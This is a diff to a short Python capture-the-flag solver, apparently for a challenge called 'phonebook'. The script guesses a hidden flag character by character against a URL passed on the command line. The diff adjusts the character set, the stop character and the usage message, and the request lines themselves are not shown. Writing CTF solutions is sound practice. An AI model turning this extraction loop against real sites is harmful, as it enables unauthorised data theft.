@@ -2,7 +2,7 @@ import requests
 import sys
 def split(word):
     return [char for char in word]
-charlist = split('''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`! @#$%^&()_-+={[}]|\:;"'<,>.?/''')
+charlist = split('''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`! @#$%^&()_-+={[}]|\:;"'<,>.?/ ''')
 flag = []
 try:
 	url = sys.argv[1]
@@ -17,11 +17,11 @@ try:
 					flag.append(char)
 					print(f"found! {''.join(flag)}")
 					break
-				if char == '/':
+				if char == ' ':
 					flag = ''.join(flag)
 					print(f'Final flag: {flag}')
 					quit()
 				else:
 					print(char)
 except:
-	print('no url specified. Example: \n\npython3 phonebookctf.py http://site.to/hack\n')
+	print('no valid url specified. Example: \n\npython3 phonebookctf.py http://site.to/hack\n')
